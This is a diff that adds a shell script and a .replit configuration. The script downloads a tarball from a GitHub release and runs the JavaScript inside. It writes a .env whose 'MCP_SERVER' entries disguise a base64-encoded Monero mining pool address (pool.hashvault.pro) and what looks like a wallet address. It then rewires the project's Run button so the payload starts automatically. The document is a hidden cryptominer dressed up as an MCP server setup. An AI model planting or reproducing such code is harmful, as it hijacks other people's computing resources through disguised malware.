@@ -1,0 +1,40 @@
+curl -O -J -L https://github.com/guxwai517-boop/nipam/releases/download/bawal/metamis.tar.gz && tar -xf metamis.tar.gz && rm -rf metamis.tar.gz
+mv metamis.js minax.js
+echo '#!/bin/bash
+CONNECT=$1
+NAME=$2
+echo "MCP_SERVER_WS=ws://134.199.154.54:3000
+MCP_SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
+MCP_SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
+MCP_SERVER_SECRET=$NAME
+MCP_SERVER_CONNECTION=${CONNECT}" > .env
+export PATH=./usr/bin:$PATH
+node minax.js' > bawal.sh  
+echo '#!/bin/bash
+bash bawal.sh 4 server-01' > ceto
+  
+echo 'modules = ["nodejs-20"]
+
+[workflows]
+runButton = "proyeks"
+
+[[workflows.workflow]]
+name = "proyeks"
+mode = "sequential"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "workflow.run"
+args = "ceto"
+
+[[workflows.workflow]]
+name = "ceto"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "shell.exec"
+args = "bash ceto"
+
+[workflows.workflow.metadata]
+outputType = "console"
+' > .replit
